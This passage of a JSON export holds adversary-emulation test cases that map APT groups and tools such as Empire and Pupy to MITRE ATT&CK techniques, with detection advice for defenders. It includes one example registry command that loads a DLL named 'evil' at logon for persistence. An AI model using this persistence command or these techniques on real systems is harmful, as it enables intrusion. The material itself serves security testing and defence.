boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6620452b-de4e-4fbc-b412-570473888796","vectrId":"6620452b-de4e-4fbc-b412-570473888796","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"6620452b-de4e-4fbc-b412-570473888796","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Obfuscated Files or Information","variant":"APT33 - Obfuscated Files or Information - PowerSploit - Empire","objective":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used base64 to encode payloads.Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of ScriptModification modules that compress and encode scripts and payloads.\n---\n[Empire](https://attack.mitre.org/software/S0363) has the ability to obfuscate commands using <code>Invoke-Obfuscation</code>.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["8e4883bf-d7b7-40ac-b157-ab6431c02b03","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a","relationship--3f29b80a-0444-4664-8faa-58a39de9264e","relationship--9d329c02-3b9f-42cc-b88b-bbacb3e4e18c","course-of-action--a09375e5-63d2-4b65-8b0d-1cfe3e6304ca","relationship--ffa8f46b-615f-4b95-8ed5-90f86eaedd20","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d","relationship--4d8df710-e1a4-4069-afef-2e8e63ed6587","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--16e0be5b-93bb-4db2-b6ed-02e34a6ce3cb","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/","Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018. https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html","Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018. https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf","Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018. https://github.com/danielbohannon/Revoke-Obfuscation","Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018. https://github.com/itsreallynick/office-crackros","Graeber, M. (2014, July 8). PowerSploit. Retrieved February 6, 2018. http://www.powershellmagazine.com/2014/07/08/powersploit/","Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017. https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/","PowerShellMafia. (2012, May 26). PowerSploit - A PowerShell Post-Exploitation Framework. Retrieved February 6, 2018. https://github.com/PowerShellMafia/PowerSploit","PowerSploit. (n.d.). PowerSploit. Retrieved February 6, 2018. http://powersploit.readthedocs.io","Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018. https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018. https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018. https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/","Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018. https://en.wikipedia.org/wiki/Duqu"],"mitreId":"T1027"},"blueTeam":{"successfulDetectionBehaviors":["Ensure logging and detection mechanisms analyze commands after being processed/interpreted, rather than the raw input. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 for this functionality. (Citation: Microsoft AMSI June 2015)\n\nMitigation of compressed and encrypted files sent over the network and through email may not be advised since it may impact normal operations.","Use signatures or heuristics to detect malicious software."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--66f94e80-7500-4982-973d-d898d1081041","vectrId":"66f94e80-7500-4982-973d-d898d1081041","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"66f94e80-7500-4982-973d-d898d1081041","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote File Copy","variant":"APT33 - Remote File Copy - Pupy - Empire","objective":"Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has downloaded additional files and programs from its C2 server.\t\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can upload and download to/from a victim machine.\n---\n[Empire](https://attack.mitre.org/software/S0363) can upload and download to and from a victim machine.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add","relationship--a06ada98-605a-47c5-9362-41e86c2ada6e","relationship--1ddae833-8280-4afa-b2b0-e250e22104fe","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ab637576-5bf9-423f-b5e8-6d1ac26bbb5c","course-of-action--cdecc44a-1dbf-4c1f-881c-f21e3f47272a","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--151dd9ac-7e33-4580-a4a4-09f71fa73f51","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--efd94521-6d23-4947-a257-1c81ac52f0d9","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf"],"mitreId":"T1105"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--67d252d4-5bba-4178-9577-704956b4ec38","vectrId":"67d252d4-5bba-4178-9577-704956b4ec38","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"67d252d4-5bba-4178-9577-704956b4ec38","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scheduled Task","variant":"APT39 - Scheduled Task","objective":"Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.","command":"[APT39](https://attack.mitre.org/groups/G0087) has created scheduled tasks.\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting tools, like AppLocker, or Software Restriction Policies where appropriate.\n---\nToolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.\n---\nConfigure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority.\n---\nConfigure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled.\n---\nLimit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9","relationship--54d5380e-07a4-49b0-8ffd-c34428c90bbe","relationship--91e941a6-64bd-42ab-94f9-aa0e90f132ff","course-of-action--f2cb6ce2-188d-4162-8feb-594f949b13dd","relationship--9d4e8b44-90f8-4a10-8419-8187d4babf24","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--8f09085f-c1cf-4321-89c4-17d93e774f6f","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--63c9cdd8-0e64-46dd-9459-3d64828b0cc7","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--1d50b715-96a2-4fd6-bf92-603ad90730fd","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599","Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014. http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017. https://twitter.com/leoloobeek/status/939248813465853953","Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016. https://technet.microsoft.com/en-us/library/cc785125.aspx","Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016. https://technet.microsoft.com/en-us/library/ee791851.aspx","Microsoft. (2012, November 15). Domain controller: Allow server operators to schedule tasks. Retrieved December 18, 2017. https://technet.microsoft.com/library/jj852168.aspx","Microsoft. (2013, May 8). Increase scheduling priority. Retrieved December 18, 2017. https://technet.microsoft.com/library/dn221960.aspx","Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019. https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events","Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017. https://technet.microsoft.com/library/dd315590.aspx","NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902","Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017. https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"],"mitreId":"T1053"},"blueTeam":{"successfulDetectionBehaviors":["Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. (Citation: Powersploit)\n\nConfigure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. (Citation: TechNet Server Operator Scheduled Task)\n\nConfigure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Manage the creation, modification, use, and permissions associated to user accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6919446f-6708-4dc1-86d7-577e6cdd9ddd","vectrId":"6919446f-6708-4dc1-86d7-577e6cdd9ddd","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"6919446f-6708-4dc1-86d7-577e6cdd9ddd","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Process Discovery","variant":"Magic Hound - Process Discovery - Pupy","objective":"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nAn example command that would obtain details on processes is \"tasklist\" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.\n\n### Mac and Linux\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware can list running processes.[Pupy](https://attack.mitre.org/software/S0192) can list the running processes and get the process ID and parent process’s ID.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580","relationship--a4c59c09-2abd-4c49-8156-0ccc9214b66e","relationship--03f30a17-095b-4656-a7db-87d98628dfd8","course-of-action--f6469191-1814-4dbe-a081-2a6daf83a10b","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--fa2a7222-e9b1-4e97-82da-42a9c4014bdd","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy"],"mitreId":"T1057"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6b1f369b-c979-4ba3-a2b7-e1793b1962be","vectrId":"6b1f369b-c979-4ba3-a2b7-e1793b1962be","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"6b1f369b-c979-4ba3-a2b7-e1793b1962be","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Registry Run Keys / Startup Folder","variant":"MuddyWater - Registry Run Keys / Startup Folder","objective":"Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* 